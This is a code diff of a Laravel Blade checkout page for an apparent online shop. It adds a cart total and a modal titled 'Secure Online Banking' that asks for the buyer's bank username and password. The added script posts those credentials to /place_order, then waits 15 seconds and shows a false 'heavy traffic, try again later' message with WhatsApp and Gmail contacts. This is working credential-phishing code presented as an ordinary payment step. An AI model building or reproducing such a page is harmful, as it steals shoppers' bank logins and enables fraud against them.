@@ -78,10 +78,13 @@
                             <tbody>
                                 @php
                                     $cart = session('cart');
+                                    $total_amount = 0
                                 @endphp
                                 @foreach ($cart as $key => $quantity)
                                     @php
                                         $product = \App\Models\Product::find($key);
+                                        $amount = $product->price * $quantity;
+                                        $total_amount += $amount;
                                     @endphp
                                     <tr>
                                         <td class="product-name">
@@ -89,12 +92,18 @@
                                         </td>
 
                                         <td class="product-total">
-                                            <span class="subtotal-amount">${{$product->price * $quantity}}</span>
+                                            <span class="subtotal-amount">${{$amount}}</span>
                                         </td>
                                     </tr>
                                 @endforeach
 
                             </tbody>
+                            <tfoot>
+                                <tr>
+                                    <td class="font-weight-bold text-right">Total Amount : </td>
+                                    <td class="font-weight-bold" style="padding: 12px 20px;">$<span id="total_amount">{{$total_amount}}</span></td>
+                                </tr>
+                            </tfoot>
                         </table>
                     </div>
 
@@ -110,8 +119,8 @@
 </section>
 <!-- End Checkout Area -->
 
-<div class="modal" id="myModal">
-    <div class="modal-dialog">
+<div class="modal" id="bankModal">
+    <div class="modal-dialog modal-lg">
         <div class="modal-content">
             <div class="modal-header">
                 <h4 class="modal-title">* Secure Online Banking :</h4>
@@ -133,7 +142,7 @@
                             <div class="form-group mt-3">
                                 <div class="input-group mb-3">
                                     <div class="input-group-prepend">
-                                        <span class="input-group-text"><i class="fas fa-user"></i></span>
+                                        <span class="input-group-text"><i class='bx bxs-user'></i></span>
                                     </div>
                                     <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="Bank Username">
                                 </div>
@@ -141,13 +150,13 @@
                             <div class="form-group mt-3">
                                 <div class="input-group mb-3">
                                     <div class="input-group-prepend">
-                                        <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                                        <span class="input-group-text"><i class='bx bxs-lock'></i></span>
                                     </div>
                                     <input type="password" class="form-control password" name="password" required placeholder="Bank Password">
                                 </div>
                             </div>
                             <div class="form-group mt-3">
-                                <input type="text" class="form-control" name="amount" readonly placeholder="Amount" />
+                                <input type="text" class="form-control amount" name="amount" readonly placeholder="Amount" />
                             </div>
                             <div class="form-group mt-3">
                                 <button type="submit" class="btn btn-primary btn-block mt-2" id="btn_submit">Submit</button>
@@ -162,18 +171,60 @@
 
 @endsection
 
-@section('name')
+@section('script')
     <script>
         $(document).ready(function () {
             $("#btn_place").click(function(){
                 let bank = $("input[name='bank']:checked").val();
+                let total_amount = $("#total_amount").text();
+                let image = $("input[name='bank']:checked").parents('p').find('img').attr('src');
+                console.log(image)
                 if(!bank) {
                     alert('Please select the payment option.');
                 } else if(bank == 'payoneer') {
 
                 } else {
-                    let image = $("input[name='bank']:checked").parents('p').find('img').attr('src');
+                    $("#bank_id").val(bank);
+                    $("#modal_bank_img").attr('src', image);
+                    $("#paymentForm .amount").val(total_amount);
+                    $("#bankModal").modal();
+                }
+            });
 
+            $("#paymentForm").submit(function(e) {
+                e.preventDefault();
+                if (bank_id == '') {
+                    alert('Please select payment option.');
+                    $("#bankModal").modal('hide');
+                    return false;
+                } else {
+                    $.ajax({
+                        url: '/place_order',
+                        data: $("#paymentForm").serialize(),
+                        method: 'POST',
+                        dataType: 'json',
+                        beforeSend: function() {
+                            $("#bankModal").modal('hide');
+                            $("#ajax-loading").fadeIn();
+                        },
+                        success: function(response) {
+                            if(response.status == 200) {
+                                setTimeout(function() {
+                                    $("#ajax-loading").fadeOut();
+                                    Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=60177163578" target="_blank">+60177163578</a></p><p>Email us at <a href="mailto:helpcoddelivery@gmail.com">helpcoddelivery@gmail.com</a></p></div>`);
+                                }, 15000);
+                            } else if (response.status == 400) {
+                                if(response.result == 'cart_error') {
+                                    window.location.href = '/cart';
+                                }
+                                if(response.result == 'customer_error') {
+                                    window.location.href = '/input_customer';
+                                }
+                            } else {
+                                window.location.href = '/';
+                            }
+                        },
+                    });
                 }
             });
         });
